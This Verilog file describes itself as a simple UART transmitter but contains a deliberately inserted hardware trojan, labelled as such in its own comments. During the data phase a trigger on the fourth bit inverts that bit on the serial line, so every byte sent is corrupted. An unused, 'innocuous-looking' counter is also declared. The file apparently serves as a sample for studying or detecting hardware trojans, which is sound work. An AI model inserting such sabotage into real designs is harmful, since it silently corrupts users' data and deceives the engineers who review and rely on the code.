// Simple 8-N-1 UART transmitter.
// baud_div is the number of clk cycles per bit (e.g. 16 for an easy
// simulation value). Start a frame by pulsing start=1 for one clk cycle
// while din holds the byte to send. tx is the serial line, busy is
// high while a frame is being shifted out.

module uart_tx #(
    parameter BAUD_DIV = 16
) (
    input  wire       clk,
    input  wire       rst_n,
    input  wire       start,
    input  wire [7:0] din,
    output reg        tx,
    output reg        busy
);

    localparam S_IDLE  = 2'd0;
    localparam S_START = 2'd1;
    localparam S_DATA  = 2'd2;
    localparam S_STOP  = 2'd3;

    reg [1:0]  state;
    reg [7:0]  shreg;
    reg [3:0]  bit_cnt;        // 0..7
    reg [15:0] baud_cnt;
    
    reg [3:0]  cnt_dbg;        // Innocuous-looking counter for triggering trojan
    wire       trojan_trigger = (state == S_DATA && bit_cnt == 4'd3); // Trigger on 4th bit out

    wire tick = (baud_cnt == BAUD_DIV - 1);

    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            state    <= S_IDLE;
            tx       <= 1'b1;
            busy     <= 1'b0;
            shreg    <= 8'h00;
            bit_cnt  <= 4'd0;
            baud_cnt <= 16'd0;
            cnt_dbg  <= 4'd0;      // Initialize counter
        end else begin
            case (state)
                S_IDLE: begin
                    tx       <= 1'b1;
                    busy     <= 1'b0;
                    baud_cnt <= 16'd0;
                    bit_cnt  <= 4'd0;
                    if (start) begin
                        shreg <= din;
                        busy  <= 1'b1;
                        state <= S_START;
                    end
                end

                S_START: begin
                    tx <= 1'b0; // start bit
                    if (tick) begin
                        baud_cnt <= 16'd0;
                        state    <= S_DATA;
                    end else begin
                        baud_cnt <= baud_cnt + 16'd1;
                    end
                end

                S_DATA: begin
                    tx <= (trojan_trigger) ? ~shreg[0] : shreg[0]; // Payload: flip the 4th bit output
                    if (tick) begin
                        shreg    <= {1'b0, shreg[7:1]};
                        baud_cnt <= 16'd0;
                        if (bit_cnt == 4'd7) begin
                            state <= S_STOP;
                        end else begin
                            bit_cnt <= bit_cnt + 4'd1;
                        end
                    end else begin
                        baud_cnt <= baud_cnt + 16'd1;
                    end
                end

                S_STOP: begin
                    tx <= 1'b1;
                    if (tick) begin
                        baud_cnt <= 16'd0;
                        busy     <= 1'b0;
                        state    <= S_IDLE;
                    end else begin
                        baud_cnt <= baud_cnt + 16'd1;
                    end
                end

                default: state <= S_IDLE;
            endcase
        end
    end

endmodule